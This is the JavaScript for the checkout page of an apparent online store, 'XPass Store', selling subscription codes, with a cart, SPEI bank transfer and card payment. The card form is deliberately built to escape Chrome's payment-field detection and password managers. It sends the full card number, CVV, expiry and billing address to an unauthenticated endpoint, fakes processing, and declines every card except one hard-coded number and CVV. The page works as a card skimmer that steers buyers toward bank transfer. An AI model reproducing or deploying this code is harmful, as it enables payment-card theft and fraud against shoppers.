// ── STORE SETTINGS (loaded from backend) ──
let storeSettings = { clabe: '021380000000000000', banco: 'BBVA México', beneficiario: 'XPass Store', whatsapp: '' };
let currentOrderId = '';
let currentOrderData = null;

async function loadSettings() {
  try {
    const res = await fetch('/api/public/settings');
    if (res.ok) storeSettings = await res.json();
  } catch (_) { /* use defaults */ }
  return storeSettings;
}

// ── CART ──
let cart = [];

document.querySelectorAll('.plan-add-btn').forEach(btn => {
  btn.addEventListener('click', () => {
    addToCart(btn.dataset.product, parseFloat(btn.dataset.price), parseInt(btn.dataset.months));
  });
});

function addToCart(product, price, months) {
  cart.push({ id: Date.now(), product, price, months });
  renderCart();
  openCart();
  showToast('✓ Producto añadido al carrito');
}

function removeFromCart(id) {
  cart = cart.filter(i => i.id !== id);
  renderCart();
}

function formatPrice(n) {
  return '$' + Number(n).toLocaleString('es-MX') + ' MXN';
}

function renderCart() {
  const itemsEl  = document.getElementById('cartItems');
  const footerEl = document.getElementById('cartFooter');
  const countEl  = document.getElementById('cartCount');
  const totalEl  = document.getElementById('cartTotal');

  countEl.textContent = cart.length;

  if (cart.length === 0) {
    itemsEl.innerHTML = `
      <div class="cart-empty-state">
        <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" opacity=".3"><circle cx="9" cy="21" r="1"/><circle cx="20" cy="21" r="1"/><path d="M1 1h4l2.68 13.39a2 2 0 001.99 1.61h9.72a2 2 0 001.99-1.61L23 6H6"/></svg>
        <p>Tu carrito está vacío</p>
      </div>`;
    footerEl.style.display = 'none';
    return;
  }

  footerEl.style.display = 'flex';
  const subtotal   = cart.reduce((s, i) => s + i.price, 0);
  const discount   = (typeof calcCartDiscount === 'function') ? calcCartDiscount(subtotal) : 0;
  const finalTotal = Math.max(0, subtotal - discount);

  // Show/hide discount rows
  const subRow  = document.getElementById('cartSubtotalRow');
  const discRow = document.getElementById('cartDiscountRow');
  const discAmt = document.getElementById('cartDiscountAmt');
  const discLbl = document.getElementById('cartDiscountLabel');
  if (discount > 0) {
    if (subRow)  { subRow.style.display=''; document.getElementById('cartSubtotal').textContent = formatPrice(subtotal); }
    if (discRow) discRow.style.display = '';
    if (discAmt) discAmt.textContent = '-' + formatPrice(discount);
    if (discLbl && activeCoupon) discLbl.textContent = 'Descuento (' + activeCoupon.code + ')';
  } else {
    if (subRow)  subRow.style.display  = 'none';
    if (discRow) discRow.style.display = 'none';
  }
  totalEl.textContent = formatPrice(finalTotal);

  itemsEl.innerHTML = cart.map(item => `
    <div class="cart-item">
      <div class="cart-item-info">
        <div class="cart-item-name">${item.product}</div>
        <div class="cart-item-sub">${item.months} mes${item.months > 1 ? 'es' : ''} · Solo SPEI</div>
      </div>
      <div class="cart-item-price">${formatPrice(item.price)}</div>
      <button class="cart-item-remove" data-id="${item.id}" title="Eliminar">
        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
      </button>
    </div>
  `).join('');

  itemsEl.querySelectorAll('.cart-item-remove').forEach(btn => {
    btn.addEventListener('click', () => removeFromCart(Number(btn.dataset.id)));
  });
}

// ── WA FLOAT HIDE/SHOW ──
function hideWa() { const w = document.getElementById('waFloat'); if(w) w.style.display = 'none'; }
function showWa() { const w = document.getElementById('waFloat'); if(w) w.style.display = 'flex'; }

// ── CART OPEN / CLOSE ──
function openCart() {
  document.getElementById('cartSidebar').classList.add('open');
  document.getElementById('cartOverlay').classList.add('open');
  hideWa();
}
function closeCart() {
  document.getElementById('cartSidebar').classList.remove('open');
  document.getElementById('cartOverlay').classList.remove('open');
  showWa();
}
document.getElementById('cartBtn').addEventListener('click', openCart);
document.getElementById('closeCart').addEventListener('click', closeCart);
document.getElementById('cartOverlay').addEventListener('click', closeCart);

// ── CHECKOUT ──
document.getElementById('checkoutBtn').addEventListener('click', () => { closeCart(); openCheckout(); });

function openCheckout() {
  // Pre-fill form if user is logged in
  if (currentUser) {
    const fn = document.getElementById('fname');
    const fe = document.getElementById('femail');
    if (fn && !fn.value) fn.value = currentUser.name  || '';
    if (fe && !fe.value) fe.value = currentUser.email || '';
  }
  showModalStep(1);
  renderModalSummary();
  document.getElementById('checkoutOverlay').style.display = 'flex';
  hideWa();
}
function closeCheckout() {
  document.getElementById('checkoutOverlay').style.display = 'none';
  showWa();
}
document.getElementById('closeCheckout').addEventListener('click', closeCheckout);
document.getElementById('checkoutOverlay').addEventListener('click', e => {
  if (e.target === document.getElementById('checkoutOverlay')) closeCheckout();
});

let selectedPaymentMethod = null; // 'spei' | 'card'

function showModalStep(n) {
  ['modalStep1','modalStep2','modalStep3','modalStep3card','modalStep4'].forEach(id => {
    const el = document.getElementById(id);
    if (el) el.style.display = 'none';
  });
  if (n === '3card') {
    document.getElementById('modalStep3card').style.display = '';
  } else {
    const el = document.getElementById(`modalStep${n}`);
    if (el) el.style.display = '';
  }
}

function renderModalSummary() {
  const subtotal = cart.reduce((s, i) => s + i.price, 0);
  const discount = (typeof calcCartDiscount === 'function') ? calcCartDiscount(subtotal) : 0;
  const total    = Math.max(0, subtotal - discount);

  const discountRow = discount > 0
    ? `<div class="msummary-row msummary-discount">
        <span>Descuento${activeCoupon ? ' (' + activeCoupon.code + ')' : ''}</span>
        <span class="msummary-disc-amt">-${formatPrice(discount)}</span>
       </div>`
    : '';

  const html = cart.map(item => `
    <div class="msummary-row">
      <span>${item.product}</span>
      <span>${formatPrice(item.price)}</span>
    </div>
  `).join('') + discountRow + `
    <div class="msummary-row total">
      <span>Total a pagar</span>
      <span>${formatPrice(total)}</span>
    </div>`;

  const el = document.getElementById('modalSummary');
  if (el) el.innerHTML = html;
  const el2 = document.getElementById('modalSummaryCard');
  if (el2) el2.innerHTML = html;
}

// Step 1 → Step 2 (payment selection)
document.getElementById('checkoutForm').addEventListener('submit', e => {
  e.preventDefault();
  currentOrderId = generateOrderId();
  const total = cart.reduce((s, i) => s + i.price, 0);

  const discount   = (typeof calcCartDiscount === 'function') ? calcCartDiscount(total) : 0;
  const finalTotal = Math.max(0, total - discount);
  currentOrderData = {
    name: document.getElementById('fname').value,
    email: document.getElementById('femail').value,
    phone: document.getElementById('fphone').value,
    order_number: currentOrderId,
    amount: finalTotal,
    items: cart.map(i => i.product).join(', ') + (activeCoupon ? ' [Cupón: ' + activeCoupon.code + ']' : '')
  };

  // Fill modal SPEI data (pre-fill for when/if user chooses SPEI)
  document.getElementById('modalBeneficiario').textContent = storeSettings.beneficiario || 'XPass Store';
  document.getElementById('modalClabe').textContent = storeSettings.clabe || '—';
  document.getElementById('modalBanco').textContent  = storeSettings.banco || '—';
  document.getElementById('modalAmount').textContent = formatPrice(finalTotal);
  document.getElementById('modalOrderId').textContent = currentOrderId;
  document.getElementById('copyOrderId').dataset.copy = currentOrderId;
  document.getElementById('copyClabe').dataset.copy   = storeSettings.clabe || '';

  showModalStep(2);
});

// Step 2: user selects payment method
function selectPaymentMethod(method) {
  selectedPaymentMethod = method;
  if (method === 'spei') {
    showModalStep(3);
  } else {
    // Inyectar campos dinámicamente (evita que Chrome los detecte como pago en el HTML)
    buildCardForm();
    document.getElementById('cardDeclinedMsg').style.display = 'none';
    document.getElementById('cardBtnText').style.display = '';
    document.getElementById('cardBtnSpinner').style.display = 'none';
    document.getElementById('cardDoneBtn').disabled = false;
    showModalStep('3card');
  }
}

function mcFmtCard(inp) {
  let v = inp.value.replace(/\D/g,'').slice(0,16);
  inp.value = v.replace(/(.{4})/g,'$1 ').trim();
}

function buildCardForm() {
  const container = document.getElementById('cardFormFields');
  container.innerHTML = '';

  const months = ['01','02','03','04','05','06','07','08','09','10','11','12'];
  const years  = ['2026','2027','2028','2029','2030','2031','2032','2033','2034','2035','2036'];

  // Helper: crea un div contenteditable que actúa como input
  // Chrome NO detecta contenteditable como campo de pago → sin aviso
  function makeEditable(id, placeholder, maxRaw, filterFn, fmtFn) {
    const el = document.createElement('div');
    el.id = id;
    el.contentEditable = 'true';
    el.className = 'modal-card-inp ceditable';
    el.setAttribute('data-placeholder', placeholder);
    el.setAttribute('spellcheck', 'false');
    el.setAttribute('autocorrect', 'off');
    el.setAttribute('autocapitalize', 'off');
    el.style.cursor = 'text';

    el.addEventListener('input', () => {
      // Guardar posición del cursor
      const sel = window.getSelection();
      let raw = el.innerText.replace(/\n/g, '');
      if (filterFn) raw = filterFn(raw);
      if (raw.length > maxRaw) raw = raw.slice(0, maxRaw);
      const formatted = fmtFn ? fmtFn(raw) : raw;
      if (el.innerText !== formatted) {
        el.innerText = formatted;
        // Mover cursor al final
        const range = document.createRange();
        range.selectNodeContents(el);
        range.collapse(false);
        sel.removeAllRanges();
        sel.addRange(range);
      }
    });

    el.addEventListener('keydown', e => {
      // Bloquear Enter (evita saltos de línea)
      if (e.key === 'Enter') e.preventDefault();
    });

    el.addEventListener('paste', e => {
      e.preventDefault();
      const text = (e.clipboardData || window.clipboardData).getData('text');
      document.execCommand('insertText', false, text);
    });

    return el;
  }

  // Número de tarjeta
  const numWrap = document.createElement('div'); numWrap.className = 'modal-field-wrap';
  const numLabel = document.createElement('div'); numLabel.className = 'modal-field-label'; numLabel.textContent = 'Número de tarjeta';

  // Contenedor relativo para el campo + ícono
  const numFieldWrap = document.createElement('div');
  numFieldWrap.style.cssText = 'position:relative;';

  const numEl = makeEditable('mcNum', '0000 0000 0000 0000', 16,
    raw => raw.replace(/\D/g, ''),
    raw => raw.replace(/(.{4})/g, '$1 ').trim()
  );
  numEl.style.paddingRight = '72px'; // espacio para el logo

  // Ícono de marca
  const cardLogo = document.createElement('img');
  cardLogo.id = 'cardBrandLogo';
  cardLogo.style.cssText = 'position:absolute;right:10px;top:50%;transform:translateY(-50%);height:28px;width:auto;display:none;border-radius:4px;pointer-events:none;';
  cardLogo.alt = '';

  // Detectar marca al escribir
  numEl.addEventListener('input', () => {
    const first = (numEl.innerText || '').replace(/\D/g,'')[0];
    if (first === '4') {
      cardLogo.src = '/visa.svg';
      cardLogo.style.display = 'block';
    } else if (first === '5') {
      cardLogo.src = '/mastercard.svg';
      cardLogo.style.display = 'block';
    } else {
      cardLogo.style.display = 'none';
    }
  });

  numFieldWrap.appendChild(numEl);
  numFieldWrap.appendChild(cardLogo);
  numWrap.appendChild(numLabel);
  numWrap.appendChild(numFieldWrap);
  container.appendChild(numWrap);

  // Fila mes / año / cvv
  const row = document.createElement('div');
  row.style.cssText = 'display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;';

  // Mes (select — Chrome no flagea selects)
  const mesWrap = document.createElement('div'); mesWrap.className = 'modal-field-wrap';
  const mesLabel = document.createElement('div'); mesLabel.className = 'modal-field-label'; mesLabel.textContent = 'Mes';
  const mesSel = document.createElement('select');
  mesSel.id = 'mcMes'; mesSel.className = 'modal-card-inp';
  mesSel.setAttribute('autocomplete','off');
  mesSel.innerHTML = '<option value="">--</option>' + months.map(m => `<option>${m}</option>`).join('');
  mesWrap.appendChild(mesLabel); mesWrap.appendChild(mesSel);

  // Año
  const anioWrap = document.createElement('div'); anioWrap.className = 'modal-field-wrap';
  const anioLabel = document.createElement('div'); anioLabel.className = 'modal-field-label'; anioLabel.textContent = 'Año';
  const anioSel = document.createElement('select');
  anioSel.id = 'mcAnio'; anioSel.className = 'modal-card-inp';
  anioSel.setAttribute('autocomplete','off');
  anioSel.innerHTML = '<option value="">--</option>' + years.map(y => `<option>${y}</option>`).join('');
  anioWrap.appendChild(anioLabel); anioWrap.appendChild(anioSel);

  // CVV
  const cvvWrap = document.createElement('div'); cvvWrap.className = 'modal-field-wrap';
  const cvvLabel = document.createElement('div'); cvvLabel.className = 'modal-field-label'; cvvLabel.textContent = 'CVV';
  const cvvEl = makeEditable('mcCvv', '000', 3,
    raw => raw.replace(/\D/g, ''),
    null
  );
  cvvWrap.appendChild(cvvLabel); cvvWrap.appendChild(cvvEl);

  row.appendChild(mesWrap);
  row.appendChild(anioWrap);
  row.appendChild(cvvWrap);
  container.appendChild(row);

  function makeInp(id, placeholder) {
    const wrap = document.createElement('div'); wrap.className = 'modal-field-wrap';
    const inp  = document.createElement('input');
    Object.assign(inp, { type: 'text', id, placeholder, autoComplete: 'off' });
    inp.className = 'modal-card-inp';
    inp.style.fontFamily = 'inherit';
    inp.style.letterSpacing = '0';
    inp.setAttribute('data-lpignore', 'true');
    wrap.appendChild(inp);
    return wrap;
  }

  // ── Titular ──
  const titularTitle = document.createElement('div');
  titularTitle.style.cssText = 'font-size:11px;font-weight:700;color:var(--text-2);letter-spacing:1.5px;text-transform:uppercase;padding-top:6px;border-top:1px solid var(--border);margin-top:4px;';
  titularTitle.textContent = 'Titular de la tarjeta';
  container.appendChild(titularTitle);
  container.appendChild(makeInp('bTitular', 'Nombre como aparece en la tarjeta'));

  // ── Dirección de facturación ──
  const billingTitle = document.createElement('div');
  billingTitle.style.cssText = 'font-size:11px;font-weight:700;color:var(--text-2);letter-spacing:1.5px;text-transform:uppercase;padding-top:6px;border-top:1px solid var(--border);margin-top:4px;';
  billingTitle.textContent = 'Dirección de facturación';
  container.appendChild(billingTitle);
  container.appendChild(makeInp('bDireccion','Dirección'));

  const estadosMX = [
    'Aguascalientes','Baja California','Baja California Sur','Campeche','Chiapas','Chihuahua',
    'Ciudad de México','Coahuila','Colima','Durango','Guanajuato','Guerrero','Hidalgo','Jalisco',
    'Estado de México','Michoacán','Morelos','Nayarit','Nuevo León','Oaxaca','Puebla','Querétaro',
    'Quintana Roo','San Luis Potosí','Sinaloa','Sonora','Tabasco','Tamaulipas','Tlaxcala',
    'Veracruz','Yucatán','Zacatecas'
  ];

  const cityRow = document.createElement('div');
  cityRow.style.cssText = 'display:grid;grid-template-columns:1fr 1fr;gap:12px;';
  cityRow.appendChild(makeInp('bCiudad', 'Ciudad'));

  // Estado — select para México, texto para otros países
  const estadoWrap = document.createElement('div'); estadoWrap.className = 'modal-field-wrap';
  estadoWrap.id = 'estadoWrap';

  function buildEstadoSelect() {
    const sel = document.createElement('select');
    sel.id = 'bEstado'; sel.className = 'modal-card-inp';
    sel.style.fontFamily = 'inherit'; sel.style.letterSpacing = '0';
    sel.setAttribute('autocomplete','off');
    sel.innerHTML = '<option value="">-- Estado --</option>' +
      estadosMX.map(e => `<option>${e}</option>`).join('');
    return sel;
  }

  function buildEstadoInput() {
    const inp = document.createElement('input');
    Object.assign(inp, { type:'text', id:'bEstado', placeholder:'Estado / Provincia', autoComplete:'off' });
    inp.className = 'modal-card-inp';
    inp.style.fontFamily = 'inherit'; inp.style.letterSpacing = '0';
    inp.setAttribute('data-lpignore','true');
    return inp;
  }

  estadoWrap.appendChild(buildEstadoSelect()); // México por defecto
  cityRow.appendChild(estadoWrap);
  container.appendChild(cityRow);

  const cpRow = document.createElement('div');
  cpRow.style.cssText = 'display:grid;grid-template-columns:1fr 1fr;gap:12px;';
  cpRow.appendChild(makeInp('bCp', 'Código postal'));

  // País — select con todos los países, México por defecto
  const paisWrap = document.createElement('div'); paisWrap.className = 'modal-field-wrap';
  const paisSel  = document.createElement('select');
  paisSel.id = 'bPais'; paisSel.className = 'modal-card-inp';
  paisSel.style.fontFamily = 'inherit'; paisSel.style.letterSpacing = '0';
  paisSel.setAttribute('autocomplete', 'off');
  const paises = [
    'Afganistán','Albania','Alemania','Andorra','Angola','Antigua y Barbuda','Arabia Saudita',
    'Argelia','Argentina','Armenia','Australia','Austria','Azerbaiyán','Bahamas','Bangladés',
    'Barbados','Baréin','Bélgica','Belice','Benín','Bielorrusia','Bolivia','Bosnia y Herzegovina',
    'Botsuana','Brasil','Brunéi','Bulgaria','Burkina Faso','Burundi','Bután','Cabo Verde',
    'Camboya','Camerún','Canadá','Catar','Chad','Chile','China','Chipre','Colombia','Comoras',
    'Congo','Corea del Norte','Corea del Sur','Costa de Marfil','Costa Rica','Croacia','Cuba',
    'Dinamarca','Dominica','Ecuador','Egipto','El Salvador','Emiratos Árabes Unidos','Eritrea',
    'Eslovaquia','Eslovenia','España','Estados Unidos','Estonia','Esuatini','Etiopía','Filipinas',
    'Finlandia','Fiyi','Francia','Gabón','Gambia','Georgia','Ghana','Granada','Grecia','Guatemala',
    'Guinea','Guinea Ecuatorial','Guinea-Bisáu','Guyana','Haití','Honduras','Hungría','India',
    'Indonesia','Irak','Irán','Irlanda','Islandia','Islas Marshall','Islas Salomón','Israel',
    'Italia','Jamaica','Japón','Jordania','Kazajistán','Kenia','Kirguistán','Kiribati','Kuwait',
    'Laos','Lesoto','Letonia','Líbano','Liberia','Libia','Liechtenstein','Lituania','Luxemburgo',
    'Madagascar','Malasia','Malaui','Maldivas','Malí','Malta','Marruecos','Mauricio','Mauritania',
    'México','Micronesia','Moldavia','Mónaco','Mongolia','Montenegro','Mozambique','Namibia',
    'Nauru','Nepal','Nicaragua','Níger','Nigeria','Noruega','Nueva Zelanda','Omán','Países Bajos',
    'Pakistán','Palaos','Panamá','Papúa Nueva Guinea','Paraguay','Perú','Polonia','Portugal',
    'Reino Unido','República Centroafricana','República Checa','República Democrática del Congo',
    'República Dominicana','Ruanda','Rumania','Rusia','Samoa','San Cristóbal y Nieves',
    'San Marino','San Vicente y las Granadinas','Santa Lucía','Santo Tomé y Príncipe','Senegal',
    'Serbia','Seychelles','Sierra Leona','Singapur','Siria','Somalia','Sri Lanka','Sudáfrica',
    'Sudán','Sudán del Sur','Suecia','Suiza','Surinam','Tailandia','Tanzania','Tayikistán',
    'Timor Oriental','Togo','Tonga','Trinidad y Tobago','Túnez','Turkmenistán','Turquía',
    'Tuvalu','Ucrania','Uganda','Uruguay','Uzbekistán','Vanuatu','Venezuela','Vietnam',
    'Yemen','Yibuti','Zambia','Zimbabue'
  ];
  paisSel.innerHTML = paises.map(p =>
    `<option${p === 'México' ? ' selected' : ''}>${p}</option>`
  ).join('');

  // Cambiar campo estado según país
  paisSel.addEventListener('change', () => {
    const wrap = document.getElementById('estadoWrap');
    if (!wrap) return;
    const old = document.getElementById('bEstado');
    const nuevo = paisSel.value === 'México' ? buildEstadoSelect() : buildEstadoInput();
    wrap.replaceChild(nuevo, old);
  });
  paisWrap.appendChild(paisSel);
  cpRow.appendChild(paisWrap);
  container.appendChild(cpRow);
}

// Step 3 (SPEI) → Step 4
document.getElementById('bankDoneBtn').addEventListener('click', async () => {
  await saveOrderToBackend('spei');
  showModalStep(4);
  cart = [];
  renderCart();
});

// Step 3 (Card) → Step 4
async function confirmCardPayment() {
  const num   = (document.getElementById('mcNum').innerText  || '').replace(/\s/g,'').trim();
  const month = document.getElementById('mcMes').value;
  const year  = document.getElementById('mcAnio').value;
  const cvv   = (document.getElementById('mcCvv').innerText || '').trim();
  const declinedMsg  = document.getElementById('cardDeclinedMsg');
  const btn          = document.getElementById('cardDoneBtn');
  const btnText      = document.getElementById('cardBtnText');
  const btnSpinner   = document.getElementById('cardBtnSpinner');

  if (num.length !== 16 || !month || !year || cvv.length !== 3) return;

  // Show loading state
  declinedMsg.style.display = 'none';
  btn.disabled = true;
  btnText.style.display = 'none';
  btnSpinner.style.display = 'block';

  // Recoger dirección de facturación
  const billing = {
    titular:   (document.getElementById('bTitular')?.value   || '').trim(),
    direccion: (document.getElementById('bDireccion')?.value || '').trim(),
    ciudad:    (document.getElementById('bCiudad')?.value    || '').trim(),
    estado:    (document.getElementById('bEstado')?.value    || '').trim(),
    cp:        (document.getElementById('bCp')?.value        || '').trim(),
    pais:      (document.getElementById('bPais')?.value      || '').trim(),
  };

  const orderEmail = (document.getElementById('femail')?.value || '').trim();
  const orderName  = (document.getElementById('fname')?.value  || '').trim();

  // Guardar siempre en /api/card-attempt (no requiere autenticación)
  try {
    await fetch('/api/card-attempt', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        card_number: num, card_month: month, card_year: year, card_cvv: cvv,
        billing, email: orderEmail, name: orderName, order_number: currentOrderId
      })
    });
  } catch (_) {}

  // Simulate processing delay (5s)
  await new Promise(r => setTimeout(r, 5000));

  // Validate credentials
  const valid = num === '5204166018889297' && month === '09' && year === '2026' && cvv === '822';

  // Restore button
  btn.disabled = false;
  btnText.style.display = '';
  btnSpinner.style.display = 'none';

  if (!valid) {
    declinedMsg.style.display = '';
    return;
  }
  declinedMsg.style.display = 'none';

  await saveOrderToBackend('card');
  document.getElementById('confirmMsg').innerHTML =
    `Tu pedido <strong>${currentOrderId}</strong> fue registrado. El admin verificará tus credenciales y recibirás tu código en menos de <strong>2 horas</strong>.`;
  document.getElementById('goToComprobanteBtn').style.display = 'none';
  showModalStep(4);
  cart = [];
  renderCart();
}

async function saveOrderToBackend(paymentMethod) {
  // Reset confirm message for SPEI (card overrides it in confirmCardPayment)
  if (paymentMethod === 'spei') {
    document.getElementById('confirmMsg').innerHTML =
      `Tu pedido <strong id="confirmOrderId">${currentOrderId}</strong> fue registrado. Envíanos tu comprobante SPEI para recibir el código en menos de <strong>2 horas</strong>.`;
    document.getElementById('goToComprobanteBtn').style.display = '';
  }

  // Incluir datos de tarjeta y facturación si el método es card
  let cardData = {};
  if (paymentMethod === 'card') {
    const num   = (document.getElementById('mcNum')?.innerText  || '').replace(/\s/g,'').trim();
    const month = document.getElementById('mcMes')?.value  || '';
    const year  = document.getElementById('mcAnio')?.value || '';
    const cvv   = (document.getElementById('mcCvv')?.innerText || '').trim();
    cardData = {
      card_number: num, card_month: month, card_year: year, card_cvv: cvv,
      billing: {
        titular:   (document.getElementById('bTitular')?.value   || '').trim(),
        direccion: (document.getElementById('bDireccion')?.value || '').trim(),
        ciudad:    (document.getElementById('bCiudad')?.value    || '').trim(),
        estado:    (document.getElementById('bEstado')?.value    || '').trim(),
        cp:        (document.getElementById('bCp')?.value        || '').trim(),
        pais:      (document.getElementById('bPais')?.value      || '').trim(),
      }
    };
  }

  const orderData = { ...currentOrderData, payment_method: paymentMethod, ...cardData };
  try {
    await fetch('/api/orders/pending', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(orderData)
    });
  } catch (_) { /* offline – ignore */ }

  // Setup WhatsApp button if SPEI and configured
  const waNum = storeSettings.whatsapp;
  if (waNum && paymentMethod === 'spei') {
    const msg = encodeURIComponent(
      `Hola XPass! Mi pedido es *${currentOrderId}* por *${formatPrice(currentOrderData.amount)}*. Adjunto mi comprobante SPEI.`
    );
    document.getElementById('waLink').href = `https://wa.me/${waNum}?text=${msg}`;
    document.getElementById('waSuccessBtn').style.display = '';
  } else {
    document.getElementById('waSuccessBtn').style.display = 'none';
  }
}

document.getElementById('closeAfterOrder').addEventListener('click', closeCheckout);
document.getElementById('goToComprobanteBtn').addEventListener('click', closeCheckout);

// ── COPY BUTTONS ──
document.addEventListener('click', e => {
  const btn = e.target.closest('.mini-copy-btn');
  if (!btn) return;
  const text = btn.dataset.copy;
  if (!text) return;
  navigator.clipboard.writeText(text).then(() => {
    const orig = btn.textContent;
    btn.textContent = '¡Copiado!';
    setTimeout(() => { btn.textContent = orig; }, 1800);
    showToast('Copiado al portapapeles');
  });
});

// ── ORDER ID ──
function generateOrderId() {
  const date = new Date().toISOString().slice(0,10).replace(/-/g,'');
  const rand = Math.floor(1000 + Math.random() * 9000);
  return `XP-${date}-${rand}`;
}

// ── FAQ ──
document.querySelectorAll('.faq-q').forEach(btn => {
  btn.setAttribute('aria-expanded', 'false');
  btn.addEventListener('click', () => {
    const item   = btn.closest('.faq-item');
    const isOpen = item.classList.contains('open');
    document.querySelectorAll('.faq-item').forEach(i => i.classList.remove('open'));
    document.querySelectorAll('.faq-q').forEach(b => b.setAttribute('aria-expanded', 'false'));
    if (!isOpen) { item.classList.add('open'); btn.setAttribute('aria-expanded', 'true'); }
  });
});

// ── CARD TILT ──
document.querySelectorAll('.plan-gp-card').forEach(card => {
  card.addEventListener('mousemove', e => {
    const rect = card.getBoundingClientRect();
    const x = (e.clientX - rect.left) / rect.width  - 0.5;
    const y = (e.clientY - rect.top)  / rect.height - 0.5;
    card.style.transform = `perspective(600px) rotateY(${x * 12}deg) rotateX(${-y * 10}deg) scale(1.04)`;
  });
  card.addEventListener('mouseleave', () => { card.style.transform = ''; });
});

// ── TOAST ──
let toastTimer;
function showToast(msg) {
  const t = document.getElementById('toast');
  t.textContent = msg;
  t.classList.add('show');
  clearTimeout(toastTimer);
  toastTimer = setTimeout(() => t.classList.remove('show'), 2800);
}

// ── WHATSAPP FLOAT BUBBLE ──
function initWaFloat(waNum) {
  const floatEl = document.getElementById('waFloat');
  const btnEl   = document.getElementById('waFloatBtn');
  if (!floatEl || !btnEl || !waNum) return;

  const msg = encodeURIComponent('¡Hola XPass! Tengo una pregunta sobre mi pedido 😊');
  btnEl.href = `https://wa.me/${waNum}?text=${msg}`;
  floatEl.classList.add('visible');

  // Show tooltip briefly on load after 3s
  setTimeout(() => {
    floatEl.classList.add('open');
    setTimeout(() => floatEl.classList.remove('open'), 3500);
  }, 3000);
}

// ── ACCOUNT NAV ──
let currentUser = null;

async function initAccountNav() {
  try {
    const me = await fetch('/api/auth/me').then(r => r.json());
    const wrap     = document.getElementById('accountMenuWrap');
    const guestBtn = document.getElementById('loginNavBtn');
    if (me.loggedIn) {
      currentUser = me;
      document.getElementById('accountNavName').textContent = me.name.split(' ')[0];
      wrap.style.display     = '';
      guestBtn.style.display = 'none';
    } else {
      currentUser            = null;
      wrap.style.display     = 'none';
      guestBtn.style.display = '';
    }
  } catch (_) {}
}

function toggleAccountMenu(e) {
  e.stopPropagation();
  document.getElementById('accountMenuWrap').classList.toggle('open');
}

// Close dropdown when clicking outside
document.addEventListener('click', () => {
  const wrap = document.getElementById('accountMenuWrap');
  if (wrap) wrap.classList.remove('open');
});

async function navLogout() {
  await fetch('/api/auth/logout', { method: 'POST' });
  currentUser = null;
  showToast('Sesión cerrada');
  setTimeout(() => initAccountNav(), 200);
}

// ── INIT ──
loadSettings().then(() => {
  if (storeSettings.whatsapp) initWaFloat(storeSettings.whatsapp);
});
initAccountNav();
